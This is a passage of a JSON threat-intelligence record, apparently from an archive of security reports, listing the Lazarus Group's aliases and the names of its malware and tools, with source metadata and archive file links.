                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536117,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653766201,
    "ts_modification_date": 1653766201,
    "files": {
        "pdf": "https://archive.orkl.eu/a827327ac25a2decf9f138af9b55b83a33743874.pdf",
        "text": "https://archive.orkl.eu/a827327ac25a2decf9f138af9b55b83a33743874.txt",
        "img": "https://archive.orkl.eu/a827327ac25a2decf9f138af9b55b83a33743874.jpg"
    }
}